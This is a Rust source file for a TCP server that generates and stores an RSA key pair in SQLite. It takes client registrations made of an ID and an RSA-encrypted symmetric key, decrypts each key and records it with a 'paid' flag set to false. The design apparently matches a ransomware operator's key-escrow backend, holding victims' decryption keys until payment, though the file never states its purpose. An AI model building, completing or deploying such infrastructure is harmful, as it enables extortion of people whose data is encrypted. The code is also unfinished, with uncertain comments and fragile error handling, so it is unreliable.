use std::{
    collections::HashMap,
    net::SocketAddr,
    thread::sleep,
    time::{Duration, SystemTime},
};

use diesel::{
    dsl::insert_into, Connection, ExpressionMethods, QueryDsl, RunQueryDsl, SqliteConnection,
};
use diesel_migrations::{embed_migrations, EmbeddedMigrations, MigrationHarness};
use models::{AsymmetricKey, ClientKey, NewAsymmetricKey, NewClientKey};
use openssl::rsa::Rsa;
use std::net::IpAddr::{V4, V6};
use tokio::net::{TcpListener, TcpSocket, TcpStream};

use crate::comms::Message;

mod comms;
mod models;
mod schema;

pub const MIGRATIONS: EmbeddedMigrations = embed_migrations!("migrations/");

pub async fn establish_connection() -> SqliteConnection {
    let database_url = "./data.db";
    SqliteConnection::establish(&database_url)
        .unwrap_or_else(|_| panic!("Error connecting to {}", database_url))
}

fn shift_u64_to_i64(number: u64) -> i64 {
    // performs 1/2 * u64 range shift to lower (allows storing u64 full range in i64 datatype)
    return (i64::MIN as i128 + (number as i128)) as i64;
}

async fn handle_message(msg: Message<'_>, socket: &TcpStream) {
    use crate::schema::asymmetric_key::dsl as asym_dsl;
    use crate::schema::client_key::dsl as client_dsl;

    let mut db = establish_connection().await;
    match msg {
        Message::RegisterClient((id, recieved_key)) => {
            if (client_dsl::client_key
                .filter(client_dsl::ucid.eq(shift_u64_to_i64(id)))
                .first(&mut db) as Result<ClientKey, _>)
                .is_ok()
            {
                if socket.writable().await.is_ok() {
                    // key is a duplicate, send rejection
                    let _ = socket.try_write(&Message::UcidReject(id).to_req().to_vec());
                }
            } else {
                let decryption_key: AsymmetricKey =
                    asym_dsl::asymmetric_key.first(&mut db).unwrap();
                // fetch asymmetric key and decrypt message here
                let p_key =
                    openssl::rsa::Rsa::private_key_from_pem(&decryption_key.private_key).unwrap(); // swap key placeholder with database read
                let p_key = openssl::pkey::PKey::from_rsa(p_key).unwrap();
                let decryptor = openssl::encrypt::Decrypter::new(&p_key).unwrap();

                let buffer_len = decryptor.decrypt_len(&recieved_key).unwrap();
                let mut decoded = vec![0u8; buffer_len];

                // Decrypt the data and get its length
                let decoded_len = decryptor.decrypt(&recieved_key, &mut decoded).unwrap();

                // Use only the part of the buffer with the decrypted data
                let decoded = &decoded[..decoded_len];

                let record: NewClientKey = NewClientKey {
                    asymmetric_key_id: 0,
                    ucid: shift_u64_to_i64(id),
                    encryption_key: decoded,
                    paid: false,
                };

                insert_into(client_dsl::client_key)
                    .values(record)
                    .execute(&mut db)
                    .unwrap();
                if socket.writable().await.is_ok() {
                    // key is a duplicate, send rejection
                    let _ = socket.try_write(&Message::Accepted(recieved_key).to_req().to_vec());
                }

                // this might produce the result we'd expect, I'll need to make sure it's decrypting with the private key
            }
        }

        Message::UcidReject(_) => return,
        Message::RateReject() => return,
        Message::Accepted(_) => return,
        Message::InvalidReq() => return,
        Message::Malformed() => return,
    }
}

async fn handle_connection(
    socket: TcpStream,
    addr: SocketAddr,
    limit_map: &mut HashMap<u128, u64>,
) {
    if !check_rate_limit(&addr, limit_map).await {
        println!("Connection recieved from: {} (Rejected, Rate Limit)", addr);
        if socket.writable().await.is_ok() {
            if let Err(_) = socket.try_write(&Message::RateReject().to_req()) {
                println!("Failed to write client reject response (timeout)");
            }
        }
        return;
    }
    println!("Connection recieved from: {}", addr);
    loop {
        let read_ready = socket.readable().await;
        if read_ready.is_ok() {
            let mut read_buff = vec![0; 1024];

            let len = socket.try_read(read_buff.as_mut_slice());
            if len.is_err() {
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                println!("Connection dropped by {}", addr);
                return;
            }
            let len = len.unwrap();
            read_buff.truncate(len);

            let msg = Message::from_req(&mut read_buff);
            handle_message(msg, &socket).await;
        } else {
            sleep(Duration::from_millis(1));
            continue;
        }
    }
}

#[allow(dead_code)]
async fn connect_to_host(delay: i32) {
    sleep(Duration::from_secs(delay.try_into().unwrap()));
    let to_tx: Vec<Vec<u8>> = vec![
        Message::RateReject().to_req(),
        Message::UcidReject(500).to_req(),
    ];
    // test - connect from another thread
    let addr = "127.0.0.1:4200".parse().unwrap();

    let socket = TcpSocket::new_v4().unwrap();
    let stream = socket.connect(addr).await.unwrap();

    for tx in to_tx {
        if stream.writable().await.is_ok() {
            println!("TX: {:?}", tx.as_slice());
            let _ = stream.try_write(tx.as_slice());
            sleep(Duration::from_millis(1));
        }
    }
}

async fn check_rate_limit(addr: &SocketAddr, limit_map: &mut HashMap<u128, u64>) -> bool {
    let since_epoch =
        SystemTime::now() // custom epoch starting 2024-1-1 (ISO 8601 format)
            .duration_since(SystemTime::UNIX_EPOCH + Duration::from_secs(1704067200))
            .unwrap()
            .as_secs();
    if let V4(ip) = addr.ip() {
        // as u128 makes a truncating cast, in this case adding 96 0 bits to the start of the number (truncation particulars of cast do not matter)
        if let Some(timestamp) = limit_map.insert(ip.to_bits() as u128, since_epoch) {
            if timestamp + 30 > since_epoch {
                // accepts one connection every 30 seconds
                return false;
            }
        }
    }
    if let V6(ip) = addr.ip() {
        if let Some(timestamp) = limit_map.insert(ip.to_bits() as u128, since_epoch) {
            if timestamp + 30 > since_epoch {
                return false;
            }
        }
    }
    return true;
}

async fn generate_and_write_key(db: &mut SqliteConnection) {
    use crate::schema::asymmetric_key::dsl as asym_dsl;

    let key = Rsa::generate(4096).unwrap();

    let record = NewAsymmetricKey {
        public_key: &key.public_key_to_pem().unwrap(),
        private_key: &key.private_key_to_pem().unwrap(),
        algo_metadata: "",
    };
    insert_into(asym_dsl::asymmetric_key)
        .values(record)
        .execute(db)
        .expect("Key could not be written to the database");
}
#[tokio::main]
async fn main() {
    use crate::schema::asymmetric_key::dsl as asym_dsl;

    let mut db = establish_connection().await;

    db.run_pending_migrations(MIGRATIONS)
        .expect("Error applying Diesel-rs SQLite migrations");

    if (asym_dsl::asymmetric_key.first(&mut db) as Result<AsymmetricKey, _>).is_err() {
        generate_and_write_key(&mut db).await;
    }

    let mut limit_map: HashMap<u128, u64> = HashMap::new();
    let listener = TcpListener::bind("127.0.0.1:4200")
        .await
        .expect("Could not bind to port 4200");
    loop {
        match listener.accept().await {
            Ok((socket, addr)) => handle_connection(socket, addr, &mut limit_map).await,
            Err(e) => println!("couldn't get client: {:?}", e),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_value_shift_1() {
        assert_eq!(shift_u64_to_i64(0), i64::MIN);
    }

    #[test]
    fn test_value_shift_2() {
        assert_eq!(shift_u64_to_i64(u64::MAX / 2), -1);
    }

    #[test]
    fn test_value_shift_3() {
        assert_eq!(shift_u64_to_i64(u64::MAX), i64::MAX);
    }
}
